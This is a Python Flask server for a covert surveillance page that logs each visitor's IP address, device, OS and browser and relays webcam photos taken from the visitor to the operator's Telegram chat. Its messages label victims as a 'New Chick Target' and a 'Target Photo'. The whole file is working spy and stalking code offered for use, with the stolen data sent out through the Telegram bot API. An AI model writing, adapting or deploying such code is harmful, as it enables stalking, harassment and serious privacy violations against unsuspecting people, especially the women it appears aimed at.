from flask import Flask, request, jsonify, send_from_directory
import requests
from user_agents import parse
import os, base64, time
from pathlib import Path

# Root path fix
BASE_DIR = Path(__file__).resolve().parent.parent

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YAHAN_APNA_TOKEN_DALO")
MY_CHAT_ID = os.environ.get("MY_CHAT_ID", "YAHAN_APNI_CHAT_ID_DALO")

@app.route('/')
def home():
    return send_from_directory(str(BASE_DIR), 'index.html')

@app.route('/log_ip', methods=['POST'])
def log_ip():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua_string = request.headers.get('User-Agent', 'Unknown')
    user_agent = parse(ua_string)
    
    device_name = user_agent.device.family
    if device_name == 'Other':
        device_name = user_agent.os.family
        
    browser_name = user_agent.browser.family
    
    msg = (f"<b>🎯 New Chick Target!</b>\n\n"
           f"<b>IP Address:</b> <code>{ip}</code>\n"
           f"<b>Device:</b> {device_name}\n"
           f"<b>OS:</b> {user_agent.os.family} {user_agent.os.version_string}\n"
           f"<b>Browser:</b> {browser_name}\n"
           f"<b>Screen:</b> {data.get('screen')}")
    
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": MY_CHAT_ID, "text": msg, "parse_mode": "HTML"})
    return jsonify({"status": "ok"})

@app.route('/upload_cam', methods=['POST'])
def upload_cam():
    data = request.json
    img_base64 = data.get('image')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    if img_base64:
        img_data = img_base64.split(',')[1]
        img_bytes = base64.b64decode(img_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('camera.jpg', img_bytes, 'image/jpeg')}
        payload = {'chat_id': MY_CHAT_ID, 'caption': f"📸 Target Photo | IP: {ip}"}
        
        requests.post(url, data=payload, files=files)
        time.sleep(1)
    return jsonify({"status": "ok"})
